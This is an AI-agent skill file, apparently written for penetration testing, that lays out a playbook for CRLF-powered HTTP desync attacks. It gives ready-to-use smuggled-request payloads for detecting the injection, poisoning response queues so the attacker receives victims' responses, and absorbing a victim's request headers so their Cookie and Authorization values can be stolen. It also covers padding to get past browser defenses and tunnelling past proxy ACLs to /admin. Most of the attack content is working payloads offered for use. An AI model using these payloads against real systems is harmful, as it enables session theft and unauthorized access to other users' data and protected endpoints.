---
name: response-queue-poisoning
description: Escalate HTTP header injection (CRLF in URL path or parameters) to critical impact via response queue poisoning and request tunnelling — smuggle requests through persistent connections to capture victim responses or bypass proxy ACLs. Use when CRLF injection exists in request headers/path and front-end maintains persistent backend connections.
---

# CRLF-Powered Desync Attacks

Inject `%0d%0a` in URL paths or parameters to smuggle complete HTTP requests through persistent connections. Two exploitation modes:

- **Response queue poisoning** — proxy reuses connections across users: smuggled request offsets the response queue, attacker receives victim's response
- **Request tunnelling** — proxy does NOT reuse connections: smuggled request bypasses proxy-layer ACLs to reach blocked endpoints directly

## When to Use

- CRLF injection confirmed (or suspected) in URL path, query parameter, or request header
- Front-end proxy + back-end with persistent upstream connections
- Standard CL.TE/TE.CL/TE.0 smuggling failed — this needs no Content-Length/Transfer-Encoding disagreement
- `crlf-response-splitting` already considered (that skill targets CSP bypass XSS via response headers; this targets request pipeline desync)

## Phase 1: Detect CRLF Injection — Differential Probing

The core method: inject a header via CRLF in the URL path, then compare responses when using the **real header name** vs a **typo'd control**. If the back-end processes real headers differently than garbage, the status code differential proves CRLF injection reached the parser.

### The Pattern

Every probe follows this structure:
```
GET /%20HTTP%2f1.1%0d%0a<HEADER_NAME>%3A%20<VALUE>%0d%0aX%3A%20x HTTP/1.1
Host: target.com
```

The `/%20HTTP%2f1.1` terminates the injected request line. Everything after `%0d%0a` is parsed as headers by the back-end. The front-end sees it as a single URL path.

Send the request twice — once with the real header name, once with a single-character typo. Different response = injection confirmed.

### Worked Example: Range Header

**Control (typo'd):**
```http
GET /%20HTTP%2F1.1%0D%0ARxnge%3A%20bytes=1-%0D%0AX:%20x HTTP/1.1
Host: target.com
```
→ Returns `200 OK` (back-end ignores `Rxnge`)

**Test (real):**
```http
GET /%20HTTP%2F1.1%0D%0ARange%3A%20bytes=1-%0D%0AX:%20x HTTP/1.1
Host: target.com
```
→ Returns `206 Partial Content` (back-end processed `Range`)

**Status code differential (200 vs 206) = CRLF injection confirmed.**

### Probe Reference

| Header | Typo | Value | Expected Differential |
|--------|------|-------|-----------------------|
| `Range` | `Rxnge` | `bytes=1-` | 200 vs **206** |
| `If-Match` | `Ix-Match` | `notright` | 200 vs **412** |
| `Expect` | `Exqect` | `100-continue` | 200 vs **100 Continue** |
| `Transfer-Encoding` | `Tzansfer-Encoding` | `chunked` | 200 vs **501** |
| `Host` (duplicate) | `Hxst` | `target.com` | 200 vs **400** |
| HTTP version | `1.1` | `13.37` | 200 vs **505** |

### Iterative Observation

Don't stop at status codes. On each probe, observe:

- **Response headers** — does an injected custom header (e.g. `x-smuggle-test: smuggle`) appear in the response? Direct proof of header injection.
- **Body content** — error pages may leak back-end server identity, framework, or parsing behavior.
- **Connection behavior** — does `Connection: keep-alive` in the injected headers keep the connection open? Required for queue poisoning.
- **Timing** — does the back-end pause (waiting for a body it expects from injected `Content-Length`)? Indicates full request parsing.

Each observation narrows the exploitation path. A 400 from duplicate Host tells you the back-end parsed headers. A keep-alive response tells you the connection stays open. A TRACE 405 tells you the back-end parsed a smuggled method. Build your model of what the back-end accepts before crafting the exploit payload.

## Phase 2: Determine Exploitation Mode

After confirming injection, test whether the proxy reuses connections across users:

1. Smuggle a request to `/nonexistent-[random]`
2. From a different session/IP, send a normal request to the same host
3. Second session receives the smuggled response → **queue poisoning** (connection reuse confirmed)
4. No cross-session leakage → **request tunnelling** only (still useful for ACL bypass)

## Phase 3a: Response Queue Poisoning

Inject two complete requests via CRLF. Front-end sees one; back-end sees two. Response #2 is queued for the next user on this connection.

```
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/account%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aFoo:%20bar HTTP/1.1
Host: target.com
```

1. Back-end processes two requests: injected `GET /` and smuggled `GET /account`
2. Sends two responses on the persistent connection
3. Front-end returns response #1 to attacker, queues response #2
4. Next legitimate user on this connection receives the `/account` response
5. Attacker's immediate follow-up request receives the victim's actual response

### Escalation: Content-Length Absorption

Smuggle a POST with large `Content-Length` that consumes the victim's request headers as body data:

```
...%0d%0a%0d%0aPOST%20/reflect%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%20300%0d%0a%0d%0adata= HTTP/1.1
```

Back-end reads 300 bytes of "body" — those bytes are the next victim's request headers. If `/reflect` echoes the body, attacker sees victim's `Cookie` and `Authorization` headers.

### Browser Defense Bypass

Browsers detecting extra response data beyond `Content-Length` will truncate and close the connection. Pad 100+ `%0d%0a` between the injected responses to delay over-read detection.

## Phase 3b: Request Tunnelling

When connections aren't shared across users, smuggle requests past proxy ACLs:

```
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aX%3A%20x HTTP/1.1
Host: target.com
```

Proxy sees `GET /` (allowed). Back-end sees `GET /` + `GET /admin`. The `/admin` response returns to the attacker on the same connection. No victim interaction needed.

**Confirmed vulnerable:** Nginx with `keepalive` upstream connections and `location`-based ACLs.

## Scanning

Nuclei templates from `turtlesec-software/crlf-desyncs` cover all probes above. CDN→origin CRLF injection: fuzz with `cdn-origin/cdn-cloud-headers-all.txt` wordlist (Akamai, Cloudflare, AWS, GCP headers that may pass CRLF through unsanitized).

## Chain With

- `http-desync-smuggling` — body-framing desync (CL vs TE) when no CRLF injection point exists
- `crlf-response-splitting` — response header CRLF → XSS via nested splitting
- `web-cache-deception-path` — cache the poisoned/tunnelled response for persistent impact
- `parser-differential-bypass` — proxy normalizes `%0d%0a` differently than origin
- `self-xss-escalation` — smuggled request forces victim into attacker's self-XSS payload
- `403-bypass` — tunnel past proxy ACLs when direct path bypass fails

## Reference

- https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning (Agarri)
- https://turtlesec.io/blog/posts/crlf-powered-desync-attacks/ (m4st3rspl1nt3r & t0xodile, BlackHat US 2026 / DEFCON 34)
- https://github.com/turtlesec-software/crlf-desyncs (Nuclei templates, labs, CDN header wordlists)
- https://portswigger.net/research/browser-powered-desync-attacks (Kettle — CL.0, pause-based desync)
